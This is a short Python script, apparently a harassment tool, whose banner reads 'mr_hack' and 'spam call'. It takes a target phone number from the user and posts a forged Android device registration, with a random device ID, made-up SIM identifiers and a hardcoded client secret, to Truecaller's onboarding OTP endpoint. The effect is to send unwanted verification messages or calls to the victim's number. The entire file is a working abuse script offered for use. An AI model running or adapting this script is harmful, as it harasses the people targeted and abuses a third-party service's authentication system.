from pyfiglet import Figlet

f = Figlet(font='ascii___')

def DrawText(text):
    return f.renderText(text)

print(DrawText("mr_hack"))
print("spam call + مكالمات مزعجة")
print("         ") 

import requests
import hashlib, random
number = input('Enter Target(Number):')
asa = '123456789'
gigk = str(''.join(random.choice(asa) for i in range(10)))

md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
print(md5)


headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }

url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"

data = '{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"'+md5+'","language":"ar","manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android","osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar","sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849","mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,"minorVersion":34}},"phoneNumber":"'+number+'","region":"region-2","sequenceNo":1}'

print(requests.post(url, headers=headers, data=data).text)